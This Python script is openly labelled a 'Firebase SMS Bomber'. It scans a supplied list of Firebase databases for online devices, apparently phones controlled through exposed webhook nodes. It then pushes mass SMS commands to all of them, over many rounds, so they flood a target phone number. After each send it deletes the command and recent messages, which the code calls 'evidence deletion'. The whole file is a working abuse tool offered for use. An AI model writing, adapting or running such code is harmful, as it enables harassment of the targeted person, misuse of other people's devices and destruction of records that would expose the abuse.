#!/usr/bin/env python3
"""
🚀 MAXIMUM SPEED Firebase SMS Bomber
- uvloop (2-4x faster event loop)
- 10,000 concurrent SMS sends
- 5,000 concurrent DB scans
- Fire-and-forget evidence deletion (non-blocking)
- Aggressive timeouts, minimal retries
- TCP_NODELAY, connection reuse, no SSL verify
"""

import asyncio
import aiohttp
import json
import sys
import time
import resource
import ssl
from typing import List, Dict, Any, Optional, Tuple

# Try uvloop for maximum speed
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP = True
except ImportError:
    UVLOOP = False

# ---------- MAXIMUM SPEED CONFIG ----------
MAX_CONCURRENT_DBS    = 5000      # Parallel database scans
MAX_CONCURRENT_DEVICES = 10000    # Parallel device status checks
TIMEOUT_FAST          = 6         # Aggressive timeout for sends
TIMEOUT_SCAN          = 10        # Slightly more patient for scans
RETRIES               = 1         # Minimal retries — move on fast
SMS_CONCURRENCY       = 10000     # Maximum parallel SMS sending
CONNECTOR_LIMIT       = 50000     # Total connection pool size
CONNECTOR_PER_HOST    = 100       # Connections per host (Firebase limit ~100)
DNS_TTL               = 300       # Cache DNS for 5 minutes
EVIDENCE_DELETE_BATCH = 5         # Number of recent msgs to delete

# ---------- System Tuning ----------
def tune_system():
    """Raise file descriptor limit to maximum for this process."""
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
        new_soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
        return new_soft
    except Exception:
        return 1024

# ---------- SSL Context (skip verification for speed) ----------
def fast_ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

# ---------- Fast Session Factory ----------
def make_fast_session(concurrency: int, timeout_secs: int) -> Tuple[aiohttp.TCPConnector, aiohttp.ClientTimeout]:
    connector = aiohttp.TCPConnector(
        limit=min(concurrency * 3, CONNECTOR_LIMIT),
        limit_per_host=CONNECTOR_PER_HOST,
        ttl_dns_cache=DNS_TTL,
        use_dns_cache=True,
        force_close=False,        # Reuse connections (keep-alive)
        enable_cleanup_closed=True,
        ssl=fast_ssl_context(),
    )
    timeout = aiohttp.ClientTimeout(
        total=timeout_secs,
        connect=3,               # 3s to establish connection
        sock_read=timeout_secs,  # Read timeout
        sock_connect=3,
    )
    return connector, timeout

# ---------- Helpers ----------
def load_configs_from_txt(filename: str = "firebase.txt") -> List[Dict]:
    """Read firebase.txt. Each line: URL [KEY]"""
    configs = []
    try:
        with open(filename, "r") as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ '{filename}' not found.", flush=True)
        return []
    if not lines:
        print("❌ File empty.", flush=True)
        return []

    # Deduplicate URLs for speed
    seen = set()
    for line in lines:
        parts = line.split()
        url = parts[0].rstrip('/')
        if url in seen:
            continue
        seen.add(url)
        key = parts[1] if len(parts) > 1 else None
        name = url.replace("https://", "").replace("http://", "").split(".")[0]
        configs.append({"name": name, "url": url, "key": key})

    print(f"📖 Loaded {len(configs)} unique configs from {filename} (deduped from {len(lines)})", flush=True)
    return configs

async def fetch_json(session: aiohttp.ClientSession, url: str, method: str = "GET",
                     data: Optional[Dict] = None, timeout: int = TIMEOUT_FAST,
                     retries: int = RETRIES) -> Any:
    """Ultra-fast HTTP request with minimal retries."""
    t = aiohttp.ClientTimeout(total=timeout)
    for attempt in range(retries):
        try:
            async with session.request(method, url, json=data, timeout=t) as resp:
                if resp.status == 200 or resp.status == 204:
                    try:
                        return await resp.json(content_type=None)
                    except Exception:
                        return None
                resp.raise_for_status()
                return await resp.json(content_type=None)
        except Exception as e:
            if attempt == retries - 1:
                return {"__error__": str(e)}
            await asyncio.sleep(0.1)  # Minimal backoff
    return {"__error__": "failed"}

async def get_online_devices_for_db(session: aiohttp.ClientSession, cfg: Dict) -> Tuple[str, List[str], Any]:
    """Fetch online devices from a single database — optimized."""
    name = cfg["name"]
    base = cfg["url"]
    key = cfg["key"]
    auth = f"?auth={key}" if key else ""

    url_clients = f"{base}/clients.json{auth}"
    data = await fetch_json(session, url_clients, timeout=TIMEOUT_SCAN)

    if not isinstance(data, dict):
        return name, [], data

    online = []
    needs_check = []
    for did, info in data.items():
        if isinstance(info, dict):
            if info.get('status') is True:
                online.append(did)
        else:
            needs_check.append(did)

    # Parallel status check for devices without inline status
    if not online and needs_check:
        check_tasks = []
        for did in needs_check:
            url_status = f"{base}/clients/{did}/status.json{auth}"
            check_tasks.append(fetch_json(session, url_status, timeout=TIMEOUT_SCAN, retries=1))
        results = await asyncio.gather(*check_tasks, return_exceptions=True)
        online = [did for did, res in zip(needs_check, results) if res is True]

    return name, online, data

async def analyze_all_databases(configs: List[Dict]) -> Tuple[Dict[str, List[str]], int, int]:
    """Scan ALL databases at maximum parallel speed."""
    all_online = {}
    total_devices = 0
    total_online = 0
    total_configs = len(configs)
    completed = 0

    connector, timeout = make_fast_session(MAX_CONCURRENT_DBS, TIMEOUT_SCAN)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        sem = asyncio.Semaphore(MAX_CONCURRENT_DBS)

        async def process_one(cfg):
            async with sem:
                return await get_online_devices_for_db(session, cfg)

        tasks = [process_one(cfg) for cfg in configs]

        for future in asyncio.as_completed(tasks):
            completed += 1
            try:
                name, online, data = await future
            except Exception as e:
                print(f"  ❌ DB error: {e}", flush=True)
                continue

            all_online[name] = online
            count_online = len(online)
            count_total = len(data) if isinstance(data, dict) else 0
            total_devices += count_total
            total_online += count_online

            if count_online > 0:
                print(f"  [{completed}/{total_configs}] ✅ {name}: {count_online} online / {count_total}", flush=True)
            elif completed % 100 == 0:
                print(f"  [{completed}/{total_configs}] scanning...", flush=True)

    return all_online, total_online, total_devices

async def delete_sms_evidence(session: aiohttp.ClientSession, base: str, key: Optional[str],
                              device_id: str):
    """Fire-and-forget: delete webhook + latest messages in parallel."""
    auth = f"?auth={key}" if key else ""

    # Delete webhook payload + fetch messages simultaneously
    webhook_url = f"{base}/clients/{device_id}/webhookEvent/sendSms.json{auth}"
    msgs_url = f"{base}/messages/{device_id}.json{auth}"

    del_webhook, msgs_data = await asyncio.gather(
        fetch_json(session, webhook_url, method="DELETE", timeout=4, retries=1),
        fetch_json(session, msgs_url, method="GET", timeout=4, retries=1),
        return_exceptions=True
    )

    # Delete latest messages in parallel batch
    if isinstance(msgs_data, dict) and not isinstance(msgs_data, Exception) and not msgs_data.get("__error__"):
        sorted_keys = sorted(msgs_data.keys(), reverse=True)[:EVIDENCE_DELETE_BATCH]
        if sorted_keys:
            del_tasks = [
                fetch_json(session, f"{base}/messages/{device_id}/{mk}.json{auth}",
                           method="DELETE", timeout=4, retries=1)
                for mk in sorted_keys
            ]
            await asyncio.gather(*del_tasks, return_exceptions=True)

async def send_sms_to_device(session: aiohttp.ClientSession, base: str, key: Optional[str],
                             device_id: str, number: str, message: str, sim: str) -> bool:
    """Send SMS + auto-delete evidence. Maximum speed."""
    auth = f"?auth={key}" if key else ""
    url = f"{base}/clients/{device_id}/webhookEvent/sendSms.json{auth}"
    payload = {
        "to": number,
        "message": message,
        "from": int(sim),
        "isSended": False
    }
    result = await fetch_json(session, url, method="PUT", data=payload,
                              timeout=TIMEOUT_FAST, retries=1)
    if isinstance(result, dict) and result.get("__error__"):
        return False

    # Fire-and-forget evidence deletion — don't wait for it
    asyncio.create_task(delete_sms_evidence(session, base, key, device_id))
    return True

async def send_to_all_online(configs: List[Dict], all_online: Dict[str, List[str]],
                             number: str, message: str, sim: str, rounds: int = 1):
    """Send SMS to ALL online devices at MAXIMUM parallel speed, N rounds per device."""
    device_list = []
    for name, devices in all_online.items():
        if not devices:
            continue
        cfg = next((c for c in configs if c["name"] == name), None)
        if cfg:
            for dev in devices:
                device_list.append((cfg, dev))

    if not device_list:
        print("❌ No online devices to send to.", flush=True)
        return

    # Build all tasks: devices × rounds — ALL fire in parallel
    all_sends = []
    for cfg, dev in device_list:
        for r in range(rounds):
            all_sends.append((cfg, dev, r + 1))

    total_tasks = len(all_sends)
    total_devices = len(device_list)
    print(f"\n⚡ BLITZ MODE: {total_devices} devices × {rounds} rounds = {total_tasks} total sends", flush=True)
    print(f"   Concurrency: {SMS_CONCURRENCY} | Timeout: {TIMEOUT_FAST}s | Retries: {RETRIES}", flush=True)

    success = 0
    failed = 0
    start = time.time()
    completed = 0

    connector, timeout = make_fast_session(SMS_CONCURRENCY, TIMEOUT_FAST)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        sem = asyncio.Semaphore(SMS_CONCURRENCY)

        async def send_one(cfg, dev, round_num):
            async with sem:
                ok = await send_sms_to_device(session, cfg["url"], cfg["key"],
                                              dev, number, message, sim)
                return dev, round_num, ok

        coros = [send_one(cfg, dev, r) for cfg, dev, r in all_sends]

        for coro in asyncio.as_completed(coros):
            completed += 1
            dev, round_num, ok = await coro
            if ok:
                success += 1
                elapsed = time.time() - start
                rate = success / elapsed if elapsed > 0 else 0
                print(f"  [{completed}/{total_tasks}] ✅ {dev} R{round_num}/{rounds} → sent+deleted | {rate:.0f} sms/sec", flush=True)
            else:
                failed += 1
                print(f"  [{completed}/{total_tasks}] ❌ {dev} R{round_num}/{rounds}", flush=True)

    # Wait a moment for fire-and-forget delete tasks to finish
    await asyncio.sleep(1)

    elapsed = time.time() - start
    rate = success / elapsed if elapsed > 0 else 0
    print(f"\n{'='*55}", flush=True)
    print(f"⚡ DONE in {elapsed:.2f}s", flush=True)
    print(f"   📱 Devices: {total_devices} | Rounds: {rounds}", flush=True)
    print(f"   ✅ Sent: {success} | ❌ Failed: {failed} | Total: {total_tasks}", flush=True)
    print(f"   📊 Speed: {rate:.1f} SMS/sec", flush=True)
    print(f"   🗑️  Evidence: auto-deleted (fire-and-forget)", flush=True)
    print(f"{'='*55}", flush=True)

async def main_async():
    # System tuning
    fd_limit = tune_system()
    print(f"🔧 System: uvloop={'✅' if UVLOOP else '❌'} | FD limit={fd_limit} | SSL=disabled", flush=True)
    print(f"⚡ Config: SMS={SMS_CONCURRENCY} | DBs={MAX_CONCURRENT_DBS} | Timeout={TIMEOUT_FAST}s", flush=True)

    configs = load_configs_from_txt("firebase.txt")
    if not configs:
        return

    print(f"\n🚀 Scanning {len(configs)} databases (max {MAX_CONCURRENT_DBS} parallel)...", flush=True)
    scan_start = time.time()
    all_online, total_online, total_devices = await analyze_all_databases(configs)
    scan_time = time.time() - scan_start

    print(f"\n{'='*55}", flush=True)
    print(f"📊 SCAN COMPLETE in {scan_time:.2f}s", flush=True)
    print(f"   Total: {total_devices} devices | Online: {total_online}", flush=True)
    for name, devices in all_online.items():
        if devices:
            print(f"   • {name}: {len(devices)} online", flush=True)
    print(f"{'='*55}", flush=True)

    if total_online == 0:
        print("❌ No online devices. Exiting.", flush=True)
        return

    number = input("\n📱 Target number (e.g. 919997902243): ").strip()
    if not number:
        print("Number required.", flush=True)
        return
    message = input("✉️  Message: ").strip()
    if not message:
        print("Message required.", flush=True)
        return
    sim = input("📶 SIM slot [0/1] (default 0): ").strip() or "0"
    if sim not in ('0','1'):
        print("Invalid SIM.", flush=True)
        return

    rounds_input = input("🔁 Rounds per device [default 1]: ").strip() or "1"
    try:
        rounds = max(1, int(rounds_input))
    except ValueError:
        rounds = 1

    total_sends = total_online * rounds
    print(f"\n💀 {total_online} devices × {rounds} rounds = {total_sends} total SMS", flush=True)
    confirm = input(f"⚡ BLITZ SEND? [yes/NO]: ").strip().lower()
    if confirm != "yes":
        print("Cancelled.", flush=True)
        return

    await send_to_all_online(configs, all_online, number, message, sim, rounds)

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user.", flush=True)

if __name__ == "__main__":
    main()

